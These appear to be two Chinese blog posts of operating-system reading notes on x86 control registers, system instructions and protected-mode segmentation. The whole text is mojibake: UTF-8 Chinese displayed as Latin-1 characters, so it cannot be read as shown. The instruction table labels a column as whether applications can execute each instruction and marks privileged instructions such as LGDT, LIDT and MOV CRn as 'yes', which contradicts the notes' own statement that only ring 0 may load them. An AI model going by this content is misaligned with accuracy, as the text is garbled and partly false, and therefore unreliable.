<p>CR3â€”åŒ…å«äº†é¡µç›®å½•çš„åŸºåœ°å€å’ŒäºŒä¸ªæ ‡å¿—ï¼ˆPCDå’ŒPWTï¼‰ã€‚è¯¥å¯„å­˜å™¨ä¹Ÿè¢«ç§°ä¸ºé¡µç›®å½•åŸºåœ°å€å¯„å­˜å™¨ï¼ˆPDBRï¼‰ã€‚é¡µç›®å½•åŸºåœ°å€åªæœ‰é«˜20ä½ç¡®å®šï¼Œä½12ä½æ˜¯0ï¼Œæ‰€ä»¥é¡µç›®å½•åœ°å€å¿…é¡»æ˜¯é¡µè¾¹ç•Œå¯¹é½çš„ï¼ˆ4Kå­—èŠ‚ï¼‰ã€‚PCDå’ŒPWTæ ‡å¿—æ§åˆ¶ç€é¡µç›®å½•åœ¨å¤„ç†å™¨å†…éƒ¨æ•°æ®ç¼“å†²åŒºçš„ç¼“å­˜ï¼ˆå®ƒä»¬ä¸æ§åˆ¶TLBé¡µç›®å½•ä¿¡æ¯çš„ç¼“å­˜ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p>CR4â€”åŒ…å«äº†ä¸€ç»„æ ‡å¿—ï¼Œè¿™äº›æ ‡å¿—å¯ç”¨äº†æ¶æ„æ–¹é¢çš„å‡ ä¸ªæ‰©å±•ï¼Œå¹¶æŒ‡æ˜äº†ç³»ç»Ÿå¯¹æŸäº›å¤„ç†å™¨æ”¯æŒçš„èƒ½åŠ›ã€‚è¿™ä¸ªå¯„å­˜å™¨å¯ä»¥é€šè¿‡MOVæŒ‡ä»¤æ–¹å¼è¿›è¡Œè¯»å–æˆ–ä¿®æ”¹ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹MOVæŒ‡ä»¤å…è®¸è¯»å–æˆ–è€…è£…è½½æ§åˆ¶å¯„å­˜å™¨(åœ¨0çº§ç‰¹æƒä¸‹)ã€‚è¿™ä¸ªé™åˆ¶æ„å‘³ç€åº”ç”¨ç¨‹åºæˆ–è€…æ“ä½œç³»ç»Ÿè¿‡ç¨‹(è¿è¡Œåœ¨1ã€2ã€3çº§ç‰¹æƒä¸‹)ä¸èƒ½è¯»å–æˆ–è€…è£…è½½æ§åˆ¶å¯„å­˜å™¨ã€‚è£…åœ¨æ§åˆ¶å¯„å­˜å™¨æ—¶ï¼Œä¿ç•™ä½åº”è¯¥ä¿æŒä»¥å‰è¯»å–çš„å€¼ã€‚</p>
</li>
</ul>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%207.png" alt="Untitled"></p>
<h2 id="CPUIDè¯†åˆ«æ§åˆ¶å¯„å­˜å™¨æ ‡å¿—">CPUIDè¯†åˆ«æ§åˆ¶å¯„å­˜å™¨æ ‡å¿—</h2>
<p>æ§åˆ¶å¯„å­˜å™¨CR4ä¸­çš„VMEã€PVIã€TSDã€DEã€PSEã€PAEã€MCEã€PGEã€PCEã€OSFXSRå’ŒOSXMMEXCPTéƒ½æ˜¯ä¸æ¨¡å¼ç›¸å…³çš„ã€‚æ‰€æœ‰çš„è¿™äº›æ ‡å¿—(é™¤äº†PCEæ ‡å¿—)åœ¨ä½¿ç”¨ä¹‹å‰éƒ½å¯ä»¥é€šè¿‡CPUIDæŒ‡ä»¤æ¥æ£€æŸ¥ä»–ä»¬å¤„ç†å™¨æ˜¯å¦å·²ç»å®ç°ã€‚</p>
<h2 id="ç³»ç»ŸæŒ‡ä»¤æ€»æ±‡">ç³»ç»ŸæŒ‡ä»¤æ€»æ±‡</h2>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>æŒ‡ä»¤æè¿°</th>
<th>å¯¹åº”ç”¨ç¨‹åºæ˜¯å¦æœ‰ç”¨</th>
<th>åº”ç”¨ç¨‹åºèƒ½å¦æ‰§è¡Œ</th>
</tr>
</thead>
<tbody>
<tr>
<td>LLDT</td>
<td>è£…è½½LDTå¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>SLDT</td>
<td>ä¿å­˜LDTå¯„å­˜å™¨</td>
<td>å¦</td>
<td>å¦</td>
</tr>
<tr>
<td>LGDT</td>
<td>è£…è½½GDTå¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>SGDT</td>
<td>ä¿å­˜GDTå¯„å­˜å™¨</td>
<td>å¦</td>
<td>å¦</td>
</tr>
<tr>
<td>LTR</td>
<td>è£…è½½ä»»åŠ¡å¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>STR</td>
<td>ä¿å­˜ä»»åŠ¡å¯„å­˜å™¨</td>
<td>å¦</td>
<td>å¦</td>
</tr>
<tr>
<td>LIDT</td>
<td>è£…è½½IDTå¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>SIDT</td>
<td>ä¿å­˜IDTå¯„å­˜å™¨</td>
<td>å¦</td>
<td>å¦</td>
</tr>
<tr>
<td>MOV CRn</td>
<td>è£…è½½å’Œä¿å­˜æ§åˆ¶å¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>SMSW</td>
<td>ä¿å­˜MSW</td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td>LMSW</td>
<td>è£…è½½MSW</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>CLTS</td>
<td>æ¸…ç©ºCR0ä¸­çš„TSæ ‡å¿—</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>ARPL</td>
<td>è°ƒæ•´RPL</td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td>LAR</td>
<td>è£…è½½è®¿é—®ç‰¹æƒ</td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td>LSL</td>
<td>è£…è½½æ®µç•Œé™</td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td>VERR</td>
<td>æ£€éªŒè¯»</td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td>VERW</td>
<td>æ£€éªŒå†™</td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td>MOV DBn</td>
<td>è£…è½½å’Œä¿å­˜è°ƒè¯•æ§åˆ¶å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>INVD</td>
<td>ä½¿Cacheæ— æ•ˆï¼Œä¸å›å†™</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>WBINVD</td>
<td>ä½¿Cacheæ— æ•ˆï¼Œå›å†™</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>INVLPG</td>
<td>ä½¿TLBé¡¹æ— æ•ˆ</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>HLT</td>
<td>åœæœº</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>LOCK(å‰ç¼€)</td>
<td>æ€»çº¿é”</td>
<td>æ˜¯</td>
<td></td>
</tr>
<tr>
<td>RSM</td>
<td>ä»ç³»ç»Ÿç®¡ç†æ¨¡å¼è¿”å›</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>RDMSR3</td>
<td>è¯»ä¸æ¨¡å¼ç›¸å…³å¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>WRMSR3</td>
<td>å†™ä¸æ¨¡å¼ç›¸å…³å¯„å­˜å™¨</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>RDPMC4</td>
<td>è¯»æ€§èƒ½ç›‘æµ‹è®¡æ•°å™¨</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>RDTSC3</td>
<td>è¯»æ—¶é—´æˆ³è®¡æ•°å™¨</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
</tbody>
</table>
<p>tipsï¼š</p>
<p>1ï¼å¯¹CPLæ˜¯1æˆ–2çš„åº”ç”¨ç¨‹åºæœ‰ç”¨<br>
2ï¼ç”±CPLæ˜¯3çš„åº”ç”¨ç¨‹åºé€šè¿‡æ§åˆ¶å¯„å­˜å™¨CR4ä¸­çš„TSDå’ŒPCEæ ‡å¿—è®¿é—®è¿™äº›æŒ‡ä»¤<br>
3ï¼è¿™äº›æŒ‡ä»¤æ˜¯åœ¨IA-32æ¶æ„ä¸­çš„Pentiumå¤„ç†å™¨å¼•å…¥çš„<br>
4ï¼è¿™ä¸ªæŒ‡ä»¤æ˜¯åœ¨IA-32æ¶æ„ä¸­çš„Pentium Pro å¤„ç†å™¨å’ŒPentiumÂ® MMXâ„¢ å¤„ç†å™¨ä¸­å¼•å…¥çš„ã€‚</p>
<h3 id="è£…è½½å’Œä¿å­˜ç³»ç»Ÿå¯„å­˜å™¨">è£…è½½å’Œä¿å­˜ç³»ç»Ÿå¯„å­˜å™¨</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox0"><label for="checkbox0"> LGDT(è£…è½½GDTRå¯„å­˜å™¨) æŠŠGDTåŸºåœ°å€å’Œç•Œé™ä»å†…å­˜ä¸­è£…è½½åˆ°GDTRå¯„å­˜å™¨ä¸­ã€‚</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox1"><label for="checkbox1"> SGDT(ä¿å­˜GDTRå¯„å­˜å™¨) æŠŠGDTRå¯„å­˜å™¨ä¸­çš„GDTåŸºåœ°å€å’Œç•Œé™ä¿å­˜åˆ°å†…å­˜ä¸­</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox2"><label for="checkbox2"> LIDT(è£…è½½IDTRå¯„å­˜å™¨) æŠŠIDTåŸºåœ°å€å’Œç•Œé™ä»å†…å­˜è£…è½½åˆ°IDTRå¯„å­˜å™¨ä¸­</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox3"><label for="checkbox3"> SIDT(ä¿å­˜IDTRå¯„å­˜å™¨) IDTRå¯„å­˜å™¨çš„IDTåŸºåœ°å€å’Œç•Œé™ä¿å­˜åˆ°å†…å­˜ä¸­ã€‚</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox4"><label for="checkbox4"> LLDT(è£…è½½LDTå¯„å­˜å™¨) ä»å†…å­˜ä¸­è£…è½½LDTæ®µé€‰æ‹©ç¬¦å’Œæ®µæè¿°ç¬¦åˆ°LDTRã€‚(æ®µé€‰æ‹©ç¬¦æ“ä½œæ•°ä¹Ÿå¯ä»¥ä½äºé€šç”¨å¯„å­˜å™¨ã€‚)</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox5"><label for="checkbox5"> SLDT(ä¿å­˜LDTå¯„å­˜å™¨) æŠŠLDTRå¯„å­˜å™¨ä¸­çš„LDTæ®µé€‰æ‹©ç¬¦ä¿å­˜å†…å­˜ä¸­æˆ–è€…é€šç”¨å¯„å­˜å™¨ä¸­ã€‚</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox6"><label for="checkbox6"> LTR(è£…è½½ä»»åŠ¡å¯„å­˜å™¨) æŠŠTSSçš„æ®µé€‰æ‹©ç¬¦å’Œæ®µæè¿°ç¬¦ä»å†…å­˜ä¸­è£…è½½åˆ°ä»»åŠ¡å¯„å­˜å™¨ä¸­(æ®µé€‰æ‹©ç¬¦æ“ä½œæ•°ä¹Ÿå¯ä»¥ä½äºé€šç”¨å¯„å­˜å™¨ä¸­)ã€‚</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox7"><label for="checkbox7"> STR(ä¿å­˜ä»»åŠ¡å¯„å­˜å™¨) æŠŠå½“å‰ä»»åŠ¡çš„ä»»åŠ¡å¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©ç¬¦ä¿å­˜åˆ°å†…å­˜æˆ–è€…é€šç”¨å¯„å­˜å™¨ä¸­ã€‚</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox8"><label for="checkbox8"> LMSW(è£…è½½æœºå™¨çŠ¶æ€å­—)å’ŒSMWS(ä¿å­˜æœºå™¨çŠ¶æ€å­—)æŒ‡ä»¤æ“ä½œæ§åˆ¶å¯„å­˜å™¨CR0çš„0åˆ°15ä½ã€‚è¿™äº›æŒ‡ä»¤æ˜¯ä¸ºå…¼å®¹16ä½intel 286å¤„ç†å™¨è€Œæä¾›çš„ã€‚è¿è¡Œåœ¨32ä½IA-32å¤„ç†å™¨ä¸Šçš„ç¨‹åºä¸åº”è¯¥å†ä½¿ç”¨è¿™äº›æŒ‡ä»¤ï¼Œç›¸ååº”è¯¥ç”¨MOVæŒ‡ä»¤æ¥è®¿é—®CR0ã€‚</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox9"><label for="checkbox9"> CLTS(å°†CR0ä¸­çš„TSæ ‡å¿—æ¸…é›¶)æŒ‡ä»¤ä¸ºå¤„ç†â€œè®¾å¤‡ä¸å¯ä½¿ç”¨â€å¼‚å¸¸(#NM)è€Œæä¾›çš„ï¼Œè¯¥å¼‚å¸¸åœ¨TSæ ‡å¿—ä¸º1ä¸”å½“å¤„ç†å™¨è¯•å›¾æ‰§è¡Œæµ®ç‚¹æŒ‡ä»¤æ—¶å‡ºç°ã€‚è¿™ä¸€æŒ‡ä»¤å…è®¸TSæ ‡å¿—åœ¨x87 FPUä¸Šä¸‹æ–‡ä¿å­˜ä»¥åæ¸…é›¶ï¼Œä»è€Œé¿å…è¿›ä¸€æ­¥å‡ºç°#NMå¼‚å¸¸ã€‚</label></p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B002/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B002/" class="post-title-link" itemprop="url">æ“ä½œç³»ç»Ÿè¯»ä¹¦ç¬”è®°02</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-30 21:10:15 / ä¿®æ”¹æ—¶é—´ï¼š21:12:48" itemprop="dateCreated datePublished" datetime="2023-09-30T21:10:15+08:00">2023-09-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">æ“ä½œç³»ç»Ÿ</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>osè¯»ä¹¦ç¬”è®°2</h1>
<h1>ä¿æŠ¤æ¨¡å¼å†…å­˜ç®¡ç†</h1>
<h2 id="2-1-å†…å­˜ç®¡ç†æ¦‚è§ˆ"><strong><strong>2.1. å†…å­˜ç®¡ç†æ¦‚è§ˆ</strong></strong></h2>
<p><img src="./images/065-read02/Untitled.png" alt="Untitled"></p>
<p>æœ‰ä¸‰ç§åœ°å€</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>é€»è¾‘åœ°å€</p>
</li>
<li class="lvl-2">
<p>çº¿æ€§åœ°å€</p>
</li>
<li class="lvl-2">
<p>ç‰©ç†åœ°å€</p>
</li>
</ul>
<p>é€»è¾‘åœ°å€ç”±ä¸€ä¸ª16ä½çš„æ®µé€‰æ‹©ç¬¦å’Œä¸€ä¸ª32ä½çš„åç§»é‡offsetç»„æˆï¼Œå¯¹CPUæ¥è¯´æ¯ä¸€ä¸ªæ“ä½œéƒ½æ˜¯ç”±é€»è¾‘åœ°å€æ¥ååŠ©å®Œæˆçš„ã€‚</p>
<p>é€šè¿‡æ®µé€‰æ‹©ç¬¦ï¼Œæ‰¾åˆ°ç›®æ ‡æ®µï¼Œå†åŠ ä¸Šåç§»é‡æ‰¾åˆ°çº¿æ€§åœ°å€ï¼Œçº¿æ€§åœ°å€å³ç¨‹åºè¿è¡Œæ—¶å€™çš„è™šæ‹Ÿåœ°å€ã€‚</p>
<p><img src="./images/065-read02/Untitled%201.png" alt="Untitled"></p>
<p>çº¿æ€§åœ°å€çš„ä¸€äº›æ ‡å¿—ä½ä¼šè®°å½•è¿™äº›é¡µçš„æƒé™ã€‚</p>
<p>æœ€åçº¿æ€§åœ°å€åˆ†ä¸ºä¸‰éƒ¨åˆ†Dirã€Tableã€Offsetä¸‰ä¸ªéƒ¨åˆ†åˆ†åˆ«ç”¨äºæŸ¥æ‰¾Page Directionaryã€Page Tableï¼Œæœ€åç»“åˆoffsetå¯ä»¥æ‰¾åˆ°å…·ä½“çš„ç‰©ç†åœ°å€ã€‚</p>
<p>é€šè¿‡ä¸‰ä¸ªåœ°å€ï¼Œå®ç°äº†ç”±CPUåˆ°ç‰©ç†åœ°å€çš„è®¿é—®æµç¨‹ï¼Œä¸­é—´ç»å†äº†è®¸å¤šè¡¨ï¼Œè¿™äº›æ“ä½œéƒ½æ˜¯ä¸ºäº†æ‰©å¤§è®¿é—®èŒƒå›´ï¼Œä»¥å°‘é‡çš„æ€»çº¿è®¿é—®å¤§é‡çš„å­˜å‚¨ç©ºé—´ã€‚</p>
<h2 id="2-2-åˆ†æ®µæœºåˆ¶">2.2.åˆ†æ®µæœºåˆ¶</h2>
<h3 id="Basic-Flat-Model">Basic Flat Model</h3>
<p>è¿™ä¸ªæ¨¡å‹æ˜¯æœ€ç›´ç™½çš„æ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰ç»å†æˆ‘ä»¬ä¸Šè¿°çš„åˆ†æ®µã€åˆ†é¡µçš„è½¬æ¢ç­‰æµç¨‹ï¼ŒCPUç›´æ¥è®¿é—®çš„å°±æ˜¯ç‰©ç†å†…å­˜ï¼Œä¸€å¯¹ä¸€æ˜ å°„ã€‚</p>
<p><img src="./images/065-read02/Untitled%202.png" alt="Untitled"></p>
<p>åœ¨è¿™ä¸ªæ¨¡å‹ä¸­æˆ‘ä»¬ä»éœ€è¦å»ºç«‹è‡³å°‘ä¸¤ä¸ªæ®µæè¿°ç¬¦ï¼Œä»£ç æ®µå’Œæ•°æ®æ®µï¼Œå¹¶ä¸”ä¸¤ä¸ªæ®µéƒ½è¦æ˜ å°„è¿›å†…å­˜ç©ºé—´ã€‚</p>
<h3 id="Protected-Flat-Model">Protected Flat Model</h3>
<p>è¿™ä¸ªæ¨¡å‹ä¸‹ï¼Œæ®µé•¿è¢«é™åˆ¶åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œä¸å…è®¸å‡ºç°è¶Šç•Œè®¿é—®ç­‰é—®é¢˜ã€‚</p>
<p><img src="./images/065-read02/Untitled%203.png" alt="Untitled"></p>
<p>å®ƒå°†ä»£ç æ®µ/æ•°æ®æ®µ/å †æ ˆæ®µç­‰å†™åœ¨ç‰¹å®šçš„åœ°æ–¹ï¼Œä¸å…è®¸ä¾‹å¦‚ä»£ç æ®µçš„æ®µæè¿°ç¬¦è®¿é—®åˆ°æ•°æ®æ®µè¿™ç§æƒ…å†µï¼Œå¯¹å†…å­˜è¿›è¡Œäº†éš”ç¦»å’Œä¿æŠ¤ï¼Œæ˜¯ä¸€ç§å†…å­˜ç®¡ç†å’Œä¿æŠ¤çš„ç†è®ºæ¨¡å‹ï¼Œé€šè¿‡åˆ’åˆ†åœ°å€ç©ºé—´ä¸ºå¤šä¸ªåŒºåŸŸå¹¶è®¾ç½®ä¸åŒçš„è®¿é—®æƒé™ï¼Œå®ç°è¿›ç¨‹é—´çš„å†…å­˜éš”ç¦»å’Œä¿æŠ¤ã€‚</p>
<p>ä½†æ˜¯ä¸åŒç¨‹åºä¹‹é—´èƒ½å¤Ÿç›¸äº’è®¿é—®æ•°æ®ï¼Œä¸å­˜åœ¨äº’é”çš„æƒ…å†µã€‚</p>
<h3 id="Multi-Segment-Model">Multi-Segment Model</h3>
<p><img src="./images/065-read02/Untitled%204.png" alt="Untitled"></p>
<p>è¿™ä¸ªæ¨¡å‹ä¸‹ï¼Œå……åˆ†åˆ©ç”¨äº†åˆ†æ®µæœºåˆ¶ï¼Œæä¾›äº†å¯¹ä»£ç ã€æ•°æ®ã€å †æ ˆçš„ä¸€ç§æ›´é«˜çº§çš„ä¿æŠ¤ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æ‹¥æœ‰ç‹¬è‡ªåˆ†é…åˆ°çš„æ®µï¼Œä¹Ÿå¯ä»¥ä¸åˆ«çš„è¿›ç¨‹å…±äº«è¿™äº›æ®µã€‚é˜²æ­¢äº†ä¸åŒç¨‹åºä¹‹é—´è¶Šç•Œè®¿é—®ã€‚</p>
<h2 id="2-3-é€»è¾‘åœ°å€å’Œçº¿æ€§åœ°å€çš„è½¬æ¢"><strong><strong>2.3. é€»è¾‘åœ°å€å’Œçº¿æ€§åœ°å€çš„è½¬æ¢</strong></strong></h2>
<h3 id="æ®µé€‰æ‹©å­ç»“æ„">æ®µé€‰æ‹©å­ç»“æ„</h3>
<p><img src="./images/065-read02/Untitled%205.png" alt="Untitled"></p>
<p>æ®µé€‰æ‹©å­é•¿åº¦ä¸º16bitsï¼Œå…¶ä½ä½3bitsæ˜¯æ ‡å¿—ä½</p>
<p>RPLæ ‡å¿—ä½å 2bitsï¼Œè¡¨ç¤ºè¯·æ±‚æ®µçš„ç‰¹æƒçº§</p>
<p>è¿™é‡Œçš„ç‰¹æƒçº§å°±æ˜¯Ring0-Ring3ï¼Œä¹Ÿå°±æ˜¯å†…æ ¸æ€ç‰¹æƒå’Œç”¨æˆ·æ€ç‰¹æƒï¼Œè¶Šæƒè®¿é—®ä¼šè¢«ç¦æ­¢</p>
<p>TIæ ‡å¿—ä½è¡¨ç¤ºè¦ç»™åˆ°çš„è¡¨æ˜¯GDTè¿˜æ˜¯LDT</p>
<p>Indexæ˜¯è¡¨ä¸­çš„ä¸‹æ ‡ï¼Œå¯ä»¥è®¿é—®8192ä¸ªï¼Œä½†æ˜¯GDTçš„ç¬¬0ä½æ˜¯ç½®ç©ºçš„ï¼Œæ‰€ä»¥åœ¨GDTåªèƒ½è®¿é—®8191ä¸ªæ®µæè¿°ç¬¦ã€‚</p>
<h3 id="æ®µå¯„å­˜å™¨">æ®µå¯„å­˜å™¨</h3>
<p>å¤„ç†å™¨æä¾›äº†6ä¸ªæ®µå¯„å­˜å™¨ï¼Œä»£ç å¯„å­˜å™¨(CS)ï¼Œæ•°æ®æ®µå¯„å­˜å™¨(DS)ï¼Œå †æ ˆæ®µå¯„å­˜å™¨(SS)ï¼Œä»¥åŠå¦å¤–ä¸‰ä¸ªæ•°æ®æ®µå¯„å­˜å™¨(ESã€FSå’ŒGS)ç»™è¿›ç¨‹ä½¿ç”¨ã€‚</p>
<p><img src="./images/065-read02/Untitled%206.png" alt="Untitled"></p>
<p>æ¯ä¸ªæ®µå¯„å­˜å™¨éƒ½ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯ç¨‹åºå‘˜å¯è§ï¼Œå¦å¤–ä¸€éƒ¨åˆ†æ˜¯ä¸å¯è§çš„ã€‚</p>
<p>ä¸å¯è§éƒ¨åˆ†åŒ…æ‹¬äº†æ®µåŸºå€ã€æ®µé™é•¿å’Œè®¿é—®æƒé™ã€‚</p>
<p>è½½å…¥æ®µå¯„å­˜å™¨ä¸€èˆ¬æœ‰ä¸¤ç§æŒ‡ä»¤ï¼š</p>
<ol>
<li class="lvl-3">
<p>ç›´æ¥è½½å…¥æŒ‡ä»¤ï¼Œå¦‚ï¼šMOVï¼ŒPOPï¼ŒLDSï¼ŒLESï¼ŒLSSï¼ŒLGSå’ŒLFSï¼Œè¿™äº›æŒ‡ä»¤æ˜ç¡®æŒ‡å®šäº†ç›¸åº”çš„å¯„å­˜å™¨ã€‚</p>
</li>
<li class="lvl-3">
<p>éšå«çš„è½½å…¥æŒ‡ä»¤ï¼Œæ¯”å¦‚CALLï¼ŒJMPï¼ŒRETç­‰æŒ‡ä»¤ï¼Œä¼´éšç€è¿™äº›æŒ‡ä»¤ï¼Œæ”¹å˜äº†CSå¯„å­˜å™¨çš„å†…å®¹ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šæ”¹å˜åˆ«çš„å¯„å­˜å™¨çš„å†…å®¹ã€‚</p>
</li>
</ol>
<h3 id="æ®µæè¿°å­">æ®µæè¿°å­</h3>
<p><img src="./images/065-read02/Untitled%207.png" alt="Untitled"></p>
<p>ç»“æ„å¦‚å›¾ã€‚</p>
<h3 id="æ®µåŸºå€">æ®µåŸºå€</h3>
<p>æŒ‡å‘æ®µåœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ã€‚å¤„ç†å™¨ä¼šå°†ä¸‰ä¸ªåŸºåœ°å€ç»„åˆåœ¨ä¸€èµ·æ„æˆä¸€ä¸ª32ä½çš„åœ°å€ã€‚</p>
<h3 id="ç±»å‹åŸŸ">ç±»å‹åŸŸ</h3>
<p>æŒ‡æ˜æ®µ/é—¨çš„ç±»å‹ï¼Œä¼šè®¾å®šè®¿é—®æƒé™ã€æˆ–è€…é—¨/æ®µçš„å„ç§ç‰¹ç‚¹ã€‚</p>
<h3 id="S-æè¿°ç¬¦ç±»å‹-æ ‡å¿—">S(æè¿°ç¬¦ç±»å‹)æ ‡å¿—</h3>
<p>ç¡®å®šæ®µæè¿°ç¬¦æ˜¯ç³»ç»Ÿæè¿°ç¬¦(Sæ ‡è®°ä¸º0)æˆ–è€…ä»£ç ã€æ•°æ®æ®µæè¿°ç¬¦(Sæ ‡è®°ä¸º1)</p>
<h3 id="DPL-æè¿°ç¬¦ç‰¹æƒçº§-åŸŸ">DPL(æè¿°ç¬¦ç‰¹æƒçº§)åŸŸ</h3>
<p>æŒ‡æ˜è¯¥æ®µçš„ç‰¹æƒçº§ã€‚ç‰¹æƒçº§ä»0ï½3ï¼Œ0ä¸ºæœ€é«˜ç‰¹æƒçº§ã€‚</p>
<h3 id="P-æ®µå­˜åœ¨-æ ‡å¿—">P(æ®µå­˜åœ¨)æ ‡å¿—</h3>
<p>æ ‡å¿—æŒ‡å‡ºè¯¥æ®µå½“å‰æ˜¯å¦åœ¨å†…å­˜ä¸­ï¼ˆ1è¡¨ç¤ºåœ¨å†…å­˜ä¸­ï¼Œ0è¡¨ç¤ºä¸åœ¨ï¼‰ã€‚å½“æŒ‡å‘è¯¥æ®µæè¿°ç¬¦çš„æ®µé€‰æ‹©ç¬¦è£…è½½äººæ®µå¯„å­˜å™¨æ—¶ï¼Œå¦‚æœè¿™ä¸ªæ ‡å¿—ä¸º0ï¼Œå¤„ç†å™¨ä¼šäº§ç”Ÿä¸€ä¸ªæ®µä¸å­˜åœ¨å¼‚å¸¸ï¼ˆNPï¼‰ã€‚</p>
<h3 id="D-B-é»˜è®¤æ“ä½œæ•°å¤§å°-é»˜è®¤æ ˆæŒ‡é’ˆå¤§å°å’Œ-æˆ–ä¸Šé™-æ ‡å¿—">D/B(é»˜è®¤æ“ä½œæ•°å¤§å°/é»˜è®¤æ ˆæŒ‡é’ˆå¤§å°å’Œ/æˆ–ä¸Šé™)æ ‡å¿—</h3>
<p>æ ¹æ®è¿™ä¸ªæ®µæè¿°ç¬¦æ‰€æŒ‡çš„æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œä»£ç æ®µï¼Œä¸€ä¸ªå‘ä¸‹æ‰©å±•çš„æ•°æ®æ®µè¿˜æ˜¯ä¸€ä¸ªå †æ ˆæ®µï¼Œè¿™ä¸ªæ ‡å¿—å®Œæˆä¸åŒçš„åŠŸèƒ½ã€‚ï¼ˆå¯¹32ä½çš„ä»£ç å’Œæ•°æ®æ®µï¼Œè¿™ä¸ªæ ‡å¿—æ€»æ˜¯è¢«ç½®ä¸º1ï¼Œè€Œ<br>
16ä½çš„ä»£ç å’Œæ•°æ®æ®µï¼Œè¿™ä¸ªæ ‡å¿—æ€»æ˜¯è¢«ç½®ä¸º0ï¼‰</p>
<h3 id="Gï¼ˆç²’åº¦ï¼‰æ ‡å¿—">Gï¼ˆç²’åº¦ï¼‰æ ‡å¿—</h3>
